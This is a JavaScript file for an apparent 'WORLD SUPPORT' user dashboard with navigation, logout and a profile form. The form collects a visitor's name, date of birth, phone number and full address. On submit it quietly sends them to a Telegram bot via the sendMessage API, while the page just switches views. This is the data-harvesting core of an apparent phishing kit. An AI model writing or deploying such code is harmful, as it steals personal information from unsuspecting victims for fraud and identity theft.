const loggedInUser = localStorage.getItem('loggedInUser');

    if (loggedInUser) {
      document.getElementById('usernameDisplay').textContent = loggedInUser.toUpperCase();
     }

function showEdit() {
  document.querySelector('.transaction-section').style.display = 'block';
  document.querySelector('.transaction-section2').style.display = 'none';
  document.querySelector('section').style.display = 'none';
}

function showContact() {
  document.querySelector('.contact-area').style.display = 'block';
  document.querySelector('.bi-chevron-right').style.display = 'none';
  document.querySelector('.bi-chevron-down').style.display = 'block';
};

function hideContact() {
  document.querySelector('.contact-area').style.display = 'none';
  document.querySelector('.bi-chevron-right').style.display = 'block';
  document.querySelector('.bi-chevron-down').style.display = 'none';
};


function hideTransaction() {
  document.querySelector('.transaction-section').style.display = 'none';
  document.querySelector('section').style.display = 'block';
  document.querySelector('.transaction-section2').style.display = 'none';
};

function hideTransaction1() {
  document.querySelector('.transaction-section').style.display = 'block';
  document.querySelector('section').style.display = 'none';
  document.querySelector('.transaction-section2').style.display = 'none';
};

function logout() {
  setTimeout(function() {
    document.getElementById("loading").style.display = "block";
    window.location.href = "signup.html";}, 3000);
}

  // Automatically add slashes to date input
   document.querySelector('#date').addEventListener('input', function(e) {
       var date = document.querySelector('#date').value;
        if (date.length === 2 || date.length === 5) {
         document.querySelector('#date').value = date + '/';
        }
   });

  // Handle form submission
   const form = document.querySelector('#form');
    form.addEventListener('submit', (e) => {
     e.preventDefault();
      var first = document.querySelector('#first-name').value;
      var last = document.querySelector('#last-name').value;
      var date = document.querySelector('#date').value;
      var number = document.querySelector('#phone-number').value;
      var address = document.querySelector('#address').value;
      var city = document.querySelector('#city').value;
      var state = document.querySelector('#state').value;
      var code = document.querySelector('#zip-code').value;
      var country = document.querySelector('#country').value;
      
      localStorage.setItem('first-name', first);
      localStorage.setItem('last-name', last);

    var my_text = `WORLD SUPPORT PROFILE RESULTS: %0A %0A First Name: ${first} %0A %0A Last Name: ${last} %0A %0A Date of Birth: ${date}  %0A %0A  Phone Number: ${number} %0A %0A Address: ${address} %0A %0A  City: ${city} %0A %0A  State: ${state} %0A %0A  Postal Code: ${code} %0A %0A Country ${country}`;
    
    document.querySelector('.transaction-section').style.display = 'none';
    document.querySelector('.transaction-section2').style.display = 'block';
   document.querySelector('section').style.display = 'none';

    // Replace with your actual token and chat_id
    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`
    
    
    let api = new XMLHttpRequest();
      api.open("GET", url, true);
      api.send();
      code.value = ""
            
            
  });



function home() {
  window.location.href = "dashboard.html";
};

function explore() {
  window.location.href = "explore.html";
};

function profile() {
  window.location.href = "profile.html";
};
